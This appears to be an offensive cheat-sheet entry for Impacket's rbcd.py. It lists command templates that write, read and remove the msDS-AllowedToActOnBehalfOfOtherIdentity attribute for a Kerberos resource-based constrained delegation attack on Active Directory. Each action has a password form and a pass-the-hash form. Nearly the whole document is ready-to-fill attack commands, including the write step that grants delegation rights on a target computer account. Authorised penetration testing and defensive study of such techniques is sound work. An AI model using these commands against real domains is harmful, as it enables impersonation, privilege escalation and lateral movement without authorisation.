# rbcd.py (imp) 

% impacket-kerberos, windows, kerberos, 88, delegation

#plateform/linux #target/local  #cat/ATTACK/EXPLOIT

## desc
```
(re)setter for property msDS-AllowedToActOnBehalfOfOtherIdentity for Kerberos RBCD attack
```


## Add (passwd) 
```bash
rbcd.py -delegate-from 'source_fqdn'$ -delegate-to 'target_fqdn'$ -action 'write' '<domain_fqdn>/<user>:<password>'
```

## Add (pth) 
```bash
rbcd.py -delegate-from 'source_fqdn'$ -delegate-to 'target_fqdn'$ -action 'write' -hashes <:nt_hash> '<domain_fqdn>/<user>'
```

## read (passwd) 
```bash
rbcd.py -delegate-to 'target_fqdn'$ -action 'read' '<domain_fqdn>/<user>:<password>'
```

## read (pth) 
```bash
rbcd.py -delegate-to 'target_fqdn'$ -action 'read' -hashes <:nt_hash> '<domain_fqdn>/<user>'
```

## remove (passwd) 
```bash
rbcd.py -delegate-from 'source_fqdn'$ -delegate-to 'target_fqdn'$ -action 'remove' '<domain_fqdn>/<user>:<password>'
```

## remove (pth) 
```bash
rbcd.py -delegate-from 'source_fqdn'$ -delegate-to 'target_fqdn'$ -action 'remove' -hashes <:nt_hash> '<domain_fqdn>/<user>'
```